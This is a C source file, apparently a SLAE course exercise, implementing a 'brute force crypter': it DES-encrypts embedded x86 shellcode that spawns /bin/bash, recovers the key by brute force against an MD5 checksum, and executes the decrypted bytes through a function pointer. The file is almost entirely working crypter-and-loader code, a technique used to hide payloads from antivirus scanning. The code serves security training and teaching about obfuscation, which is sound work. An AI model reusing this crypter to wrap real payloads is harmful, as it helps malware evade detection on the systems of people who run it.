#include <stdlib.h>
#include <string.h>
#include <openssl/des.h>
#include <openssl/md5.h>
#include <stdio.h>
#include <time.h>
#include <stdbool.h>

//Filename: bruteForceCrypter_Demo.c
//Author: Jonathan So
//Student ID: SLAE-1470
//SLAE-Exercise 7
//Complie: gcc bruteForceCrypter_Demo.c -o bruteForceCrypter_Demo -lcrypto

//Character pool for key
unsigned char key_pool[] = {0x1A, 0x2B, 0x3C,0x4D,0x5E};
//Shellcode that print Helloworld
//unsigned char shellCode[] = {0x31,0xc0,0xb0,0x04,0x31,0xdb,0xb3,0x01,0x31,0xd2,0x52,0x68,0x72,0x6c,0x64,0x0a,0x68,0x6f,0x20,0x57,0x6f,0x68,0x48,0x65,0x6c,0x6c,0x89,0xe1,0xb2,0x0d,0xcd,0x80,0x31,0xc0,0xb0,0x01,0x31,0xdb,0xcd,0x80};
unsigned char shellCode[] = {0x31,0xdb,0x53,0x68,0x43,0x43,0x90,0x90,0x68,0x42,0x42,0x43,0x43,0x68,0x68,0x41,0x42,0x42,0x68,0x2f,0x62,0x61,0x73,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe6,0x88,0x5e,0x09,0x89,0x76,0x0a,0x89,0x5e,0x0e,0x8d,0x1e,0x8d,0x4e,0x0a,0x8d,0x56,0x0e,0x31,0xc0,0xb0,0x0b,0xcd,0x80,0x00,0x00,0x00};
DES_cblock iv = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
//Temp variable for key
unsigned char key[8];
//key variables
DES_cblock randomKey;
DES_key_schedule SchrandomKey;
DES_cblock testKey;
DES_key_schedule SchtestKey;
//Checksum variables
MD5_CTX ctx;
unsigned char checksum[16];
unsigned char testChecksum[16];
//Buffer for Encrypted and Decrypted data
unsigned char* encryptShellCode[sizeof(shellCode)];
unsigned char* encryptChecksum[16];
unsigned char decryptShellCode[sizeof(shellCode)];
unsigned char decryptChecksum[16];
//Debug mode value
int debugMode = 0;
//Functions
void print_data(const char *title, const void* data, int len);
int bfDecrypt();
void execute(unsigned char shellcode[]);
void usage();

int main(int argc, char *argv[])
{
	if( argc == 2 ) {
		if(strcmp(argv[1],"-d") == 0){
			
			debugMode = 1;	
		}else{
			if(strcmp(argv[1],"-h") == 0){
				usage();
				return 0;
			}else{
				usage();
				return 0;		
			}
		}
	}
	//Init variables
	int key_no;
	srand ( time(NULL) ); //Reset for true random
	for(int i=0; i<8;i++){
		key_no = (rand() % sizeof(key_pool));
		printf("--The Random Number is %d .\n", key_no);
		key[i] = key_pool[key_no];
	}
	memset(checksum,0,sizeof(checksum));
	memset(testChecksum,0,sizeof(testChecksum));
	memset(randomKey, 0, 8);
	memcpy(randomKey, key, sizeof(key));
	DES_set_odd_parity(&iv);
	DES_set_key_unchecked(&randomKey, &SchrandomKey);
	//Calcuate MD5 checksum
	MD5_Init(&ctx);
	MD5_Update(&ctx, (unsigned char*)shellCode, sizeof(shellCode));
	MD5_Final(checksum, &ctx);
	
	//Encryption start
	DES_cbc_encrypt( (unsigned char*)shellCode, (unsigned char*)encryptShellCode, sizeof(shellCode), &SchrandomKey,&iv, DES_ENCRYPT);
	memset(iv,0,sizeof(DES_cblock));
	DES_set_odd_parity(&iv);
	DES_cbc_encrypt( (unsigned char*)checksum, (unsigned char*)encryptChecksum, sizeof(checksum), &SchrandomKey,&iv, DES_ENCRYPT);
	//Encryption end

	//Decryption start
	int found = bfDecrypt();
	if(found == 1){
		memset(iv,0,sizeof(DES_cblock)); // reset IV value everytime
		DES_set_odd_parity(&iv);
		DES_cbc_encrypt( (unsigned char*)encryptShellCode, (unsigned char*)decryptShellCode, sizeof(shellCode), &SchtestKey,&iv,DES_DECRYPT);

		//Decrypt Info
		printf("\n Key Found:\n");
		print_data("\n 1.Random Key ",randomKey,sizeof(randomKey));
		print_data("\n 2.Original ",shellCode,sizeof(shellCode));
		print_data("\n 3.Encrypted",encryptShellCode,sizeof(shellCode));
		print_data("\n 4.Decrypted",decryptShellCode,sizeof(shellCode));
		printf("\n Execute Shellcode\n");
		execute(decryptShellCode);
	}else{
		printf("Decrypt failed\n");
	}
	//Decryption end
	
	return 0;
}

void execute(unsigned char shellcode[]){
	printf("\n Shellcode Length:  %d\n", strlen(shellcode));
	int (*ret)() = (int(*)())shellcode;
	ret();
}

int bfDecrypt(){
	int found = 0;
	for(int i =0; i<sizeof(key_pool); i++){
		for(int j =0; j<sizeof(key_pool); j++){
			for(int k =0; k<sizeof(key_pool); k++){
				for(int l=0; l<sizeof(key_pool); l++){
					for(int m=0; m<sizeof(key_pool); m++){
						for(int n=0; n<sizeof(key_pool); n++){
							for(int o=0; o<sizeof(key_pool); o++){
								for(int p=0; p<sizeof(key_pool); p++){
									key[0] = key_pool[i];
									key[1] = key_pool[j];
									key[2] = key_pool[k];
									key[3] = key_pool[l];
									key[4] = key_pool[m];
									key[5] = key_pool[n];
									key[6] = key_pool[o];
									key[7] = key_pool[p];					
									memcpy(testKey, key, sizeof(key));

									DES_set_key_unchecked(&testKey, &SchtestKey);
									
									memset(iv,0,sizeof(DES_cblock)); // reset iv value
									DES_set_odd_parity(&iv);
									//Decrypt shllcode
									DES_cbc_encrypt( (unsigned char*)encryptShellCode, (unsigned char*)decryptShellCode, sizeof(shellCode), &SchtestKey,&iv,DES_DECRYPT);
									
									
									memset(iv,0,sizeof(DES_cblock));
									DES_set_odd_parity(&iv);
									DES_cbc_encrypt( (unsigned char*)encryptChecksum, (unsigned char*)decryptChecksum, sizeof(checksum), &SchtestKey,&iv,DES_DECRYPT);
		
									MD5_Init(&ctx);
									MD5_Update(&ctx, decryptShellCode, sizeof(decryptShellCode));
									MD5_Final(testChecksum, &ctx);
									if(debugMode == 1){
										//Testing info
										printf("\ni=%d,j=%d,k=%d,l=%d,m=%d,n=%d,o=%d,p=%d",i,j,k,l,m,n,o,p);
										print_data("\n testKey ",key,sizeof(key));
										print_data("Decrypted",decryptShellCode,sizeof(shellCode));
										print_data("MD5 checksum ",checksum,sizeof(checksum));
										print_data("MD5 regenera ",testChecksum,sizeof(checksum));
										print_data("MD5 decrypt  ",decryptChecksum,sizeof(checksum));
									}
									if(memcmp(testChecksum,decryptChecksum,sizeof(checksum))==0){
										return 1;
									}
								}
							}
						}			
					}	
				}	
			}
		}
	}
	return 0;
}

void usage(){
	printf("./bruteForceCrypter | -h Help | -d Debug mode|\n");
}

void print_data(const char *title, const void* data, int len)
{
	printf("%s : ",title);
	const unsigned char * p = (const unsigned char*)data;
	int i = 0;
	
	for (; i<len;++i)
		printf("%02X ", *p++);
	printf("\n");
}
